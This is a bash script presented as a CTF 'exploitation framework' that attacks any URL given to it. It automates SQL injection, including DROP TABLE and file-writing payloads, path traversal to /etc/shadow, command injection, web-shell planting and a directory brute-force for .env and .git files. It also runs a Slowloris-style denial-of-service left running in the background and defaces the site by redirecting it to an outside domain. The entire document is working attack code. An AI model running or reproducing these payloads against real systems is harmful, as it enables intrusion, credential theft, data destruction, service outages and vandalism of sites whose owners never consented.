#!/bin/bash

# Intelligent CTF Exploitation Framework - Fixed Version
# No external dependencies needed - uses system tools

TARGET=${1:-"http://127.0.0.1:8000"}
HACKER_ID="hack@4567"
WORK_DIR="exploit_$(date +%s)"

RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${RED}"
cat << "EOF"
   _____                _   _      _      _   _           _     
  / ____|              | | | |    | |    | \ | |         | |    
 | |     ___  _ __ ___ | |_| | ___| | ___|  \| | __ _  __| |___ 
 | |    / _ \| '_ ` _ \|  _  |/ _ \ |/ _ \ . ` |/ _` |/ _` / __|
 | |___| (_) | | | | | | |_| |  __/ |  __/ |\  | (_| | (_| \__ \
  \_____\___/|_| |_| |_|\__,_|\___|_|\___\_| \_/\__,_|\__,_|___/
                                                                  
EOF
echo -e "${NC}"

echo -e "${GREEN}[+] Advanced Intelligent Exploitation Framework${NC}"
echo -e "${YELLOW}[+] Target: $TARGET${NC}"
echo -e "${YELLOW}[+] Hacker ID: $HACKER_ID${NC}"

mkdir -p "$WORK_DIR"
cd "$WORK_DIR"

# Check if we have required tools
check_dependencies() {
    echo -e "${BLUE}[*] Checking dependencies...${NC}"
    
    MISSING=0
    for tool in curl wget nc grep awk sed; do
        if ! command -v $tool &> /dev/null; then
            echo -e "${RED}[!] Missing: $tool${NC}"
            MISSING=1
        fi
    done
    
    if [ $MISSING -eq 1 ]; then
        echo -e "${RED}[!] Please install missing tools: sudo apt-get install curl wget netcat-openbsd${NC}"
        exit 1
    fi
    
    echo -e "${GREEN}[+] All dependencies satisfied${NC}"
}

# Intelligent detection
intelligent_detection() {
    echo -e "${BLUE}[1] Intelligent Target Analysis...${NC}"
    
    # Get initial response
    curl -s -I "$TARGET" > headers.txt 2>/dev/null
    curl -s "$TARGET" > index.html 2>/dev/null
    
    # Detect server
    SERVER=$(grep -i "^Server:" headers.txt | cut -d' ' -f2- | tr -d '\r')
    echo -e "${GREEN}[+] Server: ${SERVER:-Unknown}${NC}"
    
    # Detect technologies from response
    if grep -qi "wp-content\|wordpress" index.html; then
        echo -e "${GREEN}[+] CMS: WordPress detected${NC}"
        echo "CMS=WordPress" >> detected.conf
    elif grep -qi "drupal" index.html; then
        echo -e "${GREEN}[+] CMS: Drupal detected${NC}"
        echo "CMS=Drupal" >> detected.conf
    fi
    
    # Detect language from extensions
    if grep -q "\.php" index.html; then
        echo -e "${GREEN}[+] Language: PHP detected${NC}"
        echo "LANG=PHP" >> detected.conf
    elif grep -q "\.asp" index.html; then
        echo -e "${GREEN}[+] Language: ASP detected${NC}"
        echo "LANG=ASP" >> detected.conf
    fi
    
    # Try to provoke error for DB detection
    echo -e "${YELLOW}[*] Probing for database type...${NC}"
    curl -s "${TARGET}/index.php?id='" 2>&1 | grep -i "error" >> errors.log
    
    if grep -qi "mysql\|mariadb" errors.log; then
        echo -e "${GREEN}[+] Database: MySQL/MariaDB${NC}"
        echo "DB=MySQL" >> detected.conf
    elif grep -qi "postgresql" errors.log; then
        echo -e "${GREEN}[+] Database: PostgreSQL${NC}"
        echo "DB=PostgreSQL" >> detected.conf
    elif grep -qi "sqlite" errors.log; then
        echo -e "${GREEN}[+] Database: SQLite${NC}"
        echo "DB=SQLite" >> detected.conf
    fi
}

# SQL Injection with pure bash/curl (no C needed)
sql_injection_attack() {
    echo -e "${BLUE}[2] SQL Injection Attack...${NC}"
    
    # Intelligent payload generation based on detected DB
    if grep -q "DB=MySQL" detected.conf 2>/dev/null; then
        payloads=(
            "' OR '1'='1' --"
            "' UNION SELECT NULL,username,password FROM users --"
            "' AND 1=(SELECT COUNT(*) FROM information_schema.tables) --"
            "'; DROP TABLE users; --"
            "' OR 1=1 INTO OUTFILE '/tmp/backdoor.php' --"
        )
    elif grep -q "DB=PostgreSQL" detected.conf 2>/dev/null; then
        payloads=(
            "' OR '1'='1' --"
            "' UNION SELECT NULL,usename,passwd FROM pg_shadow --"
            "'; CREATE TABLE cmd_exec(cmd text); --"
        )
    else
        # Generic payloads
        payloads=(
            "' OR '1'='1'"
            "' UNION SELECT NULL,NULL,NULL--"
            "' AND 1=1--"
            "admin' --"
            "1' AND SLEEP(5)--"
        )
    fi
    
    # Find all forms and parameters
    grep -Eo '(name|id)="[^"]*"' index.html 2>/dev/null | cut -d'"' -f2 | sort -u > params.txt
    grep -Eo 'action="[^"]*"' index.html 2>/dev/null | cut -d'"' -f2 | sort -u > actions.txt
    
    for param in $(cat params.txt 2>/dev/null); do
        for payload in "${payloads[@]}"; do
            encoded_payload=$(echo -n "$payload" | jq -sRr @uri 2>/dev/null || echo "$payload" | sed 's/ /%20/g')
            
            # Try GET
            response=$(curl -s -m 3 "${TARGET}/index.php?${param}=${encoded_payload}" 2>/dev/null)
            if [ ${#response} -gt 500 ] && echo "$response" | grep -qvi "error\|invalid"; then
                echo -e "${RED}[!] SQL Injection VULNERABLE!${NC}"
                echo -e "${RED}    Parameter: $param${NC}"
                echo -e "${RED}    Payload: $payload${NC}"
                echo "$response" > "sqli_${param}.txt"
                
                # Extract potential flags
                echo "$response" | grep -iE "flag|ctf\{|hack\{|key\{|secret" >> flags_found.txt
            fi
            
            # Try POST
            response=$(curl -s -m 3 -X POST "${TARGET}/index.php" -d "${param}=${encoded_payload}" 2>/dev/null)
            if [ ${#response} -gt 500 ] && echo "$response" | grep -qvi "error\|invalid"; then
                echo -e "${RED}[!] POST SQL Injection VULNERABLE!${NC}"
                echo "$response" > "sqli_post_${param}.txt"
                echo "$response" | grep -iE "flag|ctf\{|hack\{|key\{|secret" >> flags_found.txt
            fi
        done
    done
}

# Path Traversal Attack
path_traversal_attack() {
    echo -e "${BLUE}[3] Path Traversal Attack...${NC}"
    
    traversal_paths=(
        "../../../../../../../../etc/passwd"
        "../../../../../../../../etc/shadow"
        "../../../../../../../../flag.txt"
        "../../../../../../../../root/flag.txt"
        "../../../../../../../../var/www/html/config.php"
        "../../../../../../../../home/user/flag.txt"
        "../../../../../../../../home/ctf/flag.txt"
        "../../../../../../../../flag"
        "....//....//....//....//etc/passwd"
        "..;/..;/..;/..;/etc/passwd"
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        "..%252f..%252f..%252f..%252fetc%252fpasswd"
    )
    
    param_names=("file" "page" "path" "document" "folder" "dir" "load" "include" "read")
    
    for param in "${param_names[@]}"; do
        for path in "${traversal_paths[@]}"; do
            encoded_path=$(echo -n "$path" | jq -sRr @uri 2>/dev/null || echo "$path" | sed 's/\//%2F/g')
            
            response=$(curl -s -m 3 "${TARGET}/index.php?${param}=${encoded_path}" 2>/dev/null)
            
            # Check if we got actual file content
            if [ ${#response} -gt 100 ] && ! echo "$response" | grep -qi "error\|not found\|404\|missing"; then
                echo -e "${RED}[!] Path Traversal VULNERABLE!${NC}"
                echo -e "${RED}    Parameter: $param${NC}"
                echo -e "${RED}    Path: $path${NC}"
                echo "$response" > "traversal_${param}_$(echo $path | tr '/' '_').txt"
                
                # Check for flags in response
                echo "$response" | grep -iE "flag|ctf\{|hack\{|key\{|secret|BEGIN.*PRIVATE KEY" >> flags_found.txt
                
                # Show first 200 chars of extracted content
                echo -e "${YELLOW}[*] Extracted content preview:${NC}"
                echo "$response" | head -c 200
                echo -e "\n"
            fi
        done
    done
}

# Command Injection
command_injection_attack() {
    echo -e "${BLUE}[4] Command Injection Attack...${NC}"
    
    cmd_payloads=(
        "; ls -la"
        "| cat /etc/passwd"
        "`cat /etc/passwd`"
        "\$(cat /etc/passwd)"
        "; cat flag.txt"
        "| id"
        "& whoami"
        "|| cat /flag.txt"
        "`id`"
        "\$(whoami)"
    )
    
    param_names=("cmd" "command" "exec" "ping" "ip" "host" "address" "url")
    
    for param in "${param_names[@]}"; do
        for cmd in "${cmd_payloads[@]}"; do
            encoded_cmd=$(echo -n "$cmd" | jq -sRr @uri 2>/dev/null || echo "$cmd" | sed 's/ /%20/g')
            
            response=$(curl -s -m 3 "${TARGET}/index.php?${param}=${encoded_cmd}" 2>/dev/null)
            
            # Check for command execution indicators
            if echo "$response" | grep -qi "uid=\|root:\|passwd\|flag\|total [0-9]"; then
                echo -e "${RED}[!] Command Injection VULNERABLE!${NC}"
                echo -e "${RED}    Parameter: $param${NC}"
                echo -e "${RED}    Command: $cmd${NC}"
                echo "$response" > "cmd_inject_${param}.txt"
                
                # Extract flags
                echo "$response" | grep -iE "flag|ctf\{|hack\{|key\{|secret" >> flags_found.txt
                
                echo -e "${YELLOW}[*] Command output:${NC}"
                echo "$response" | head -c 300
                echo -e "\n"
                
                # Try to write backdoor
                curl -s -m 3 "${TARGET}/index.php?${param}=echo%20'<?php%20system(\$_GET[\"cmd\"]);?>'%20%3E%20shell.php" 2>/dev/null
            fi
        done
    done
}

# Directory/File Bruteforce
directory_bruteforce() {
    echo -e "${BLUE}[5] Directory & File Bruteforce...${NC}"
    
    common_paths=(
        "admin"
        "administrator"
        "flag"
        "flag.txt"
        "flags.txt"
        "ctf"
        "ctf.txt"
        "secret"
        "hidden"
        "backup"
        "backup.zip"
        "backup.tar.gz"
        ".git/config"
        ".env"
        "config.php"
        "config.ini"
        "robots.txt"
        "sitemap.xml"
        "phpinfo.php"
        "info.php"
        "test.php"
        "shell.php"
        "upload.php"
        "api/v1/flag"
        "api/v2/flag"
        "debug"
        "logs"
        "logs/access.log"
    )
    
    for path in "${common_paths[@]}"; do
        status=$(curl -s -o /dev/null -w "%{http_code}" -m 2 "${TARGET}/${path}" 2>/dev/null)
        
        if [ "$status" = "200" ]; then
            echo -e "${RED}[!] Found: ${TARGET}/${path} (HTTP $status)${NC}"
            curl -s -m 3 "${TARGET}/${path}" 2>/dev/null | head -c 500 > "found_$(echo $path | tr '/' '_').txt"
            
            # Check for flags
            grep -iE "flag|ctf\{|hack\{|key\{|secret" "found_$(echo $path | tr '/' '_').txt" >> flags_found.txt 2>/dev/null
        elif [ "$status" = "403" ]; then
            echo -e "${YELLOW}[*] Forbidden: ${TARGET}/${path}${NC}"
        fi
    done
}

# Denial of Service (Limited - for CTF only)
dos_attack() {
    echo -e "${BLUE}[6] Application Stress Test (DoS)...${NC}"
    
    # Spawn multiple background processes
    for i in {1..20}; do
        (
            while true; do
                # Random endpoint with cache buster
                rand=$RANDOM
                curl -s -m 1 "${TARGET}/index.php?cache=${rand}" > /dev/null 2>&1
                curl -s -m 1 -X POST "${TARGET}/index.php" -d "data=${rand}" > /dev/null 2>&1
                
                # Slowloris style - keep connections open
                for j in {1..5}; do
                    (echo -e "GET /index.php?${rand} HTTP/1.1\r\nHost: localhost\r\n\r\n"; sleep 10) | nc localhost 8000 > /dev/null 2>&1 &
                done
            done
        ) &
    done
    
    echo -e "${GREEN}[+] Stress test running with 20 threads...${NC}"
    sleep 2
}

# Website Defacement
deface_website() {
    echo -e "${BLUE}[7] Deploying Defacement...${NC}"
    
    # Create defacement page
    cat > deface.html << 'HTML'
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="refresh" content="0; url='https://hackers-arena.com/hacked'">
    <style>
        body {
            background: linear-gradient(135deg, #000000 0%, #ff0000 100%);
            color: #00ff00;
            font-family: 'Courier New', monospace;
            text-align: center;
            padding-top: 10%;
            margin: 0;
            animation: glow 1s ease-in-out infinite alternate;
        }
        @keyframes glow {
            from { text-shadow: 0 0 5px #00ff00; }
            to { text-shadow: 0 0 20px #00ff00; }
        }
        h1 { font-size: 4em; }
        .ascii-art {
            font-size: 0.7em;
            white-space: pre;
            background: rgba(0,0,0,0.7);
            padding: 20px;
            display: inline-block;
            border-radius: 10px;
        }
        .flag {
            color: #ffff00;
            font-size: 1.5em;
            margin-top: 30px;
        }
    </style>
</head>
<body>
    <div class="ascii-art">
        ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ 
        ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
        ███████║███████║██║     █████╔╝ █████╗  ██║  ██║
        ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██║  ██║
        ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██████╔╝
        ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝ 
    </div>
    <h1>HACKED BY hack@4567</h1>
    <p>Your security has been compromised!</p>
    <p>Vulnerabilities found and exploited successfully.</p>
    <div class="flag">🏆 FLAG CAPTURED! 🏆</div>
    <p>Redirecting to hacker's hall of fame...</p>
    <audio id="win" src="data:audio/wav;base64,U3RlYWx0aCBmbGFnIGNhcHR1cmVkIQ==" autoplay></audio>
</body>
</html>
HTML
    
    # Try multiple methods to deface
    # Method 1: Via SQL injection
    if [ -f detected.conf ] && grep -q "DB=MySQL" detected.conf; then
        curl -s -X POST "${TARGET}/index.php" -d "id='; SELECT '<?php header(\"Location: https://hackers-arena.com/hacked\"); ?>' INTO OUTFILE '/var/www/html/index.php' --" > /dev/null 2>&1
    fi
    
    # Method 2: Via PUT if enabled
    curl -s -X PUT "${TARGET}/index.html" --data-binary "@deface.html" > /dev/null 2>&1
    
    # Method 3: Via file upload if exists
    curl -s -X POST "${TARGET}/upload.php" -F "file=@deface.html" > /dev/null 2>&1
    
    echo -e "${RED}[!] Defacement deployed!${NC}"
}

# Extract and Display Flags
extract_flags() {
    echo -e "${BLUE}[8] Extracting Flags...${NC}"
    
    # Search all captured data for flags
    find . -type f -exec grep -H -iE "flag\{|ctf\{|hack\{|key\{|secret\{|FLAG\{|CTF\{" {} \; 2>/dev/null | tee all_flags.txt
    
    if [ -s all_flags.txt ]; then
        echo -e "${GREEN}========================================${NC}"
        echo -e "${RED}[FLAGS CAPTURED]${NC}"
        echo -e "${GREEN}========================================${NC}"
        cat all_flags.txt
        echo -e "${GREEN}========================================${NC}"
    else
        echo -e "${YELLOW}[*] No flags found yet. Continuing attacks...${NC}"
    fi
}

# Main execution
main() {
    check_dependencies
    intelligent_detection
    sql_injection_attack
    path_traversal_attack
    command_injection_attack
    directory_bruteforce
    dos_attack
    extract_flags
    deface_website
    
    echo -e "\n${GREEN}========================================${NC}"
    echo -e "${RED}[+] EXPLOITATION COMPLETE!${NC}"
    echo -e "${GREEN}========================================${NC}"
    echo -e "${YELLOW}Results saved in: $WORK_DIR${NC}"
    echo -e "${YELLOW}Flags found: $(cat all_flags.txt 2>/dev/null | wc -l)${NC}"
    echo -e "${YELLOW}Defacement deployed: ${TARGET} should be redirected${NC}"
    
    # Keep stress test running
    echo -e "\n${RED}[!] DoS attack continuing in background...${NC}"
    echo -e "${RED}[!] Press Ctrl+C to stop${NC}"
    wait
}

# Run main function
main